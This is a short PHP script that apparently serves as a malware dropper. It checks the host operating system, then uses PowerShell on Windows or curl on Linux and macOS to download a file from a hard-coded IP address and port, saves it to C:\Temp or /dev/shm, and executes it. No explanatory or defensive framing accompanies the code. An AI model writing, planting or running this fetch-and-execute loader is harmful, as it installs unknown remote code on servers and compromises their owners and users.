<?php
$os = strtoupper(substr(PHP_OS, 0, 3));

if ($os === 'WIN') {
    $path = 'C:\\Temp\\m.exe';
    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://45.145.12.49:8080/ffff.sfx', '$path')\"");
    system($path);
} else {
    // Linux/macOS
    $path = '/dev/shm/m';
    system("curl -s http://45.145.12.49:8080/ffff.sfx -o $path");
    system("chmod +x $path && $path");
}
?>